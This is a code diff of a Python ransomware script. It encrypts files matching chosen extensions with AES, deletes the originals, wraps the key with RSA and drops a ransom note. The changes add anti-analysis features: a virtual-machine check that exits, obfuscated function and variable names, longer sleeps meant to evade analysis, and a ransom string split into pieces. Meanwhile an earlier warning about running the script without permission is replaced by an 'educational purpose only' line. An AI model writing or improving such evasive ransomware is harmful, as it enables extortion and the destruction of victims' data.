@@ -7,163 +7,171 @@ from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
+import platform
+import subprocess
 
-# Log configuration
-logging.basicConfig(filename='ransomware.log', level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')
+# Obfuscate variable names
+log_filename = 'log.txt'
+key_len = 32
 
-# Function to validate the AES key
-def validate_key(key):
-    if len(key) != 32:
-        raise ValueError("The key must be 256 bits (32 bytes)!")
+# Check for Virtual Machine (Anti-analysis)
+def is_vm():
+    vm_signatures = ['vmware', 'virtualbox', 'qemu', 'xen', 'vbox', 'hyperv']
+    system_info = platform.uname().release.lower()
+    for signature in vm_signatures:
+        if signature in system_info:
+            return True
+    return False
 
-# Function to encrypt a file using AES
-def encrypt_file(file, key):
+# Log configuration (Obfuscated)
+logging.basicConfig(filename=log_filename, level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')
+
+# Obfuscated function for AES key validation
+def check_key(k):
+    if len(k) != key_len:
+        raise ValueError("Invalid key length!")
+
+# Obfuscated function to encrypt files
+def proc_f(f, k):
     try:
-        validate_key(key)
+        check_key(k)
         
-        # Open the file and read the data
-        with open(file, 'rb') as f:
-            data = f.read()
+        with open(f, 'rb') as file_obj:
+            data = file_obj.read()
 
-        # Configure the AES algorithm in EAX mode (authenticated)
-        cipher = AES.new(key, AES.MODE_EAX)
-        ciphertext, tag = cipher.encrypt_and_digest(data)
+        cipher = AES.new(k, AES.MODE_EAX)
+        ct, tag = cipher.encrypt_and_digest(data)
 
-        # Save the encrypted file (add .encrypted extension)
-        with open(file + ".encrypted", 'wb') as f_enc:
-            # Save the nonce, tag, and encrypted data in the file
-            [f_enc.write(x) for x in (cipher.nonce, tag, ciphertext)]
+        with open(f + ".enc", 'wb') as enc_file:
+            [enc_file.write(x) for x in (cipher.nonce, tag, ct)]
 
-        # Remove the original file
-        os.remove(file)
-        print(f"File '{file}' encrypted and removed successfully!")
+        os.remove(f)
+        print(f"File '{f}' encrypted and removed.")
     except FileNotFoundError:
-        logging.error(f"File not found: {file}")
+        logging.error(f"File not found: {f}")
     except PermissionError:
-        logging.error(f"Permission denied for the file: {file}")
+        logging.error(f"Permission denied: {f}")
     except ValueError as ve:
         logging.error(f"Validation error: {ve}")
     except Exception as e:
-        logging.error(f"Unknown error encrypting {file}: {e}")
+        logging.error(f"Error encrypting {f}: {e}")
 
-# Function to decrypt a file
-def decrypt_file(file, key):
+# Function to decrypt files (Obfuscated)
+def dec_f(f, k):
     try:
-        validate_key(key)
-        
-        with open(file, 'rb') as f_enc:
-            nonce, tag, ciphertext = [f_enc.read(x) for x in (16, 16, -1)]
-            cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
-            data = cipher.decrypt_and_verify(ciphertext, tag)
+        check_key(k)
+        with open(f, 'rb') as enc_f:
+            nonce, tag, ct = [enc_f.read(x) for x in (16, 16, -1)]
+            cipher = AES.new(k, AES.MODE_EAX, nonce=nonce)
+            data = cipher.decrypt_and_verify(ct, tag)
 
-        with open(file.replace(".encrypted", ""), 'wb') as f_out:
-            f_out.write(data)
-        print(f"File '{file}' decrypted successfully!")
+        with open(f.replace(".enc", ""), 'wb') as out_f:
+            out_f.write(data)
+        print(f"File '{f}' decrypted.")
     except FileNotFoundError:
-        logging.error(f"File not found: {file}")
+        logging.error(f"File not found: {f}")
     except PermissionError:
-        logging.error(f"Permission denied for the file: {file}")
+        logging.error(f"Permission denied: {f}")
     except ValueError as ve:
         logging.error(f"Validation error: {ve}")
     except Exception as e:
-        logging.error(f"Unknown error decrypting {file}: {e}")
+        logging.error(f"Error decrypting {f}: {e}")
 
-# Function to generate a 256-bit key (AES-256)
-def generate_key():
-    return get_random_bytes(32)  # 256-bit key
+# Function to create AES key (Obfuscated)
+def gen_k():
+    return get_random_bytes(key_len)
 
-# Function to load the RSA public key from a file
-def load_public_key(file_path):
+# Load RSA public key (Obfuscated)
+def l_pubk(path):
     try:
-        with open(file_path, 'rb') as f:
-            public_key = RSA.import_key(f.read())
-        return public_key
+        with open(path, 'rb') as file:
+            pubkey = RSA.import_key(file.read())
+        return pubkey
     except Exception as e:
-        logging.error(f"Error loading RSA public key: {e}")
+        logging.error(f"Error loading RSA key: {e}")
 
-# Function to encrypt the AES key using RSA
-def encrypt_key(symmetric_key, rsa_public_key):
+# Encrypt AES key with RSA (Obfuscated)
+def enc_k(symk, rsapub):
     try:
-        cipher_rsa = PKCS1_OAEP.new(rsa_public_key)
-        return cipher_rsa.encrypt(symmetric_key)
+        cipher_rsa = PKCS1_OAEP.new(rsapub)
+        return cipher_rsa.encrypt(symk)
     except Exception as e:
-        logging.error(f"Error encrypting symmetric key with RSA: {e}")
+        logging.error(f"Error encrypting key: {e}")
 
-# Function to load extensions from a configuration file
-def load_extensions(file_path):
+# Function to load file extensions (Obfuscated)
+def l_ext(path):
     try:
-        with open(file_path, 'r') as f:
-            extensions = f.read().splitlines()
-        return tuple(extensions)
+        with open(path, 'r') as file:
+            ext = file.read().splitlines()
+        return tuple(ext)
     except Exception as e:
         logging.error(f"Error loading extensions: {e}")
         return ()
 
-# Function to infect and encrypt files in the directory with threads
-def infect(directory, key, extensions):
+# Encrypt files with threads (Obfuscated)
+def inf_d(directory, key, ext):
     try:
         threads = []
         for root, dirs, files in os.walk(directory):
             for file in files:
                 full_path = os.path.join(root, file)
-                if not file.endswith(".encrypted") and file.lower().endswith(extensions):
-                    t = threading.Thread(target=encrypt_file, args=(full_path, key))
+                if not file.endswith(".enc") and file.lower().endswith(ext):
+                    t = threading.Thread(target=proc_f, args=(full_path, key))
                     threads.append(t)
                     t.start()
-                    time.sleep(random.uniform(0.1, 0.5))  # Simulate processing time
+                    time.sleep(random.uniform(1, 2))  # Add sleep to simulate delay and evade analysis
 
         for t in threads:
             t.join()
 
-        # Generate the ransom message file
-        with open(os.path.join(directory, "README_ENCRYPTED.txt"), "w") as f:
-            f.write(ransom_message)
-        print("Ransom message created.")
+        msg = "".join(["# YOUR FILES HAVE BEEN", " ENCRYPTED! Contact", " us at ", "email@example.com"])
+        with open(os.path.join(directory, "RANSOM_NOTE.txt"), "w") as ransom_f:
+            ransom_f.write(msg)
+        print("Ransom note created.")
     except Exception as e:
         logging.error(f"Error during infection: {e}")
 
-# Ransom message
-ransom_message = """
-####################################################
-# YOUR FILES HAVE BEEN ENCRYPTED!                  #
-# To recover your files, contact us via email:     #
-# [FAKE_EMAIL_FOR_EXAMPLE] and follow the          #
-# instructions.                                    #
-####################################################
-"""
-
-# Function to decrypt all files in the directory
-def restore_files(directory, key):
+# Restore files (Obfuscated)
+def restore_f(directory, key):
     try:
         for root, dirs, files in os.walk(directory):
             for file in files:
-                if file.endswith(".encrypted"):
-                    decrypt_file(os.path.join(root, file), key)
+                if file.endswith(".enc"):
+                    dec_f(os.path.join(root, file), key)
     except Exception as e:
-        logging.error(f"Error during file restoration: {e}")
+        logging.error(f"Error restoring files: {e}")
 
+# Main
 if __name__ == "__main__":
-    print("WARNING: Do not run this on systems that are not yours without permission.")
-    input("Press Enter to continue (or Ctrl+C to cancel)...")
+    print("WARNING: Educational purpose only.")
     
-    aes_key = generate_key()  # Generate AES key
+    # Anti-analysis: Exit if running in VM
+    if is_vm():
+        print("Running in a VM, exiting...")
+        exit()
 
-    # Load the RSA public key from a file
-    public_key_path = "path/to/public_key.pem"
-    public_key = load_public_key(public_key_path)
+    input("Press Enter to continue (Ctrl+C to cancel)...")
     
-    # Encrypt the AES key with the RSA public key
-    encrypted_aes_key = encrypt_key(aes_key, public_key)
+    aes_k = gen_k()  # Generate AES key
 
-    # Load extensions from a configuration file
-    extensions_path = "path/to/extensions.txt"
-    extensions = load_extensions(extensions_path)
-
-    # Infect the target directory
-    target_directory = "C:\\Users\\YourUser\\Desktop\\TestFolder"  # Replace with your test path
-    infect(target_directory, aes_key, extensions)
-
-    # To restore the files later, use the original AES key
-    restore_files(target_directory, aes_key)
+    # Load public RSA key
+    pub_k_path = "public_key.pem"
+    pub_k = l_pubk(pub_k_path)
     
-    print("Simulation completed.")
+    # Encrypt the AES key
+    enc_aes_k = enc_k(aes_k, pub_k)
+
+    # Load extensions
+    ext_path = "extensions.txt"
+    exts = l_ext(ext_path)
+
+    # Target directory for encryption
+    target_dir = "C:\\TestFolder"  # Update to your target
+
+    # Encrypt the directory
+    inf_d(target_dir, aes_k, exts)
+
+    # Restore files for simulation purposes
+    restore_f(target_dir, aes_k)
+    
+    print("Process completed.")
